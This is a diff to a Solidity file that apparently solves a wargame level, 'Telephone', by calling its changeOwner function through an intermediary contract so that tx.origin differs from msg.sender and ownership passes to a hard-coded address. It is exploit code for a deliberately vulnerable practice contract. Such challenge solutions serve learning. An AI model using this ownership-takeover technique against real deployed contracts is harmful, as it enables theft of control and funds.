@@ -1,14 +1,32 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "src/level04.sol";
+import "../src/level04.sol";
 
-contract Attacker 
+contract A
 {
-    Telephone level04 = Telephone(0xe9359849E96B548Faf8399A11d217A2AC5FE13eB);
-
-    function hack() external
+    Telephone level;
+    constructor(address _level) payable
     {
-        level04.changeOwner(msg.sender);
+        level = Telephone(_level);
+    }
+
+    function exploit() external
+    {
+        level.changeOwner(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2);
+    }
+}
+
+contract B
+{
+    A a;
+    constructor(address _a)
+    {
+        a = A(_a);
+    }
+
+    function send_call() external 
+    {
+        a.exploit();
     }
 }
